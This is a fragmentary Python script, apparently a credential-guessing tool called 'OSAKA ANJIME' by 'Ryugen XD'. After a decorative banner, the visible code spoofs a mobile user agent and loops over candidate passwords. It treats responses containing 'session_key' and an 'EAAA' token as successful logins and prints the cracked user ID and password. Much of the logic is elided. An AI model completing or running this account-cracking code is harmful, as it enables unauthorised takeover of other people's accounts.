...
▒█▄▄▄█ ▒█▄▄▄█ ▒█░▒█ ▒█░▒█ ▒█░▒█
 ...
 Old Old 🗿 ``emot batu``
		""")
		print("%s [%sはい%s] %sTOOL NAME : %sOSAKA ANJIME"%(G,R,G,B,G))
		print("%s [%sはい%s] %sVERSION   : %s0.1"%(G,R,G,B,G))
		print("%s [%sはい%s] %sAUTHOR    : %sRyugen XD"%(G,R,G,B,G))
		print("%s [%sはい%s] %sGITHUB    : github.com/ryugenxd"%(G,R,G,B)) 
		print("")
...
'Mozilla/5.0 (Linux; Android 9; Xperia X Compact) AppleWebKit/537.36 (KHTML, Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[OK] %s|%s|%s\033[0;97m         "%(uid, pw,ua))
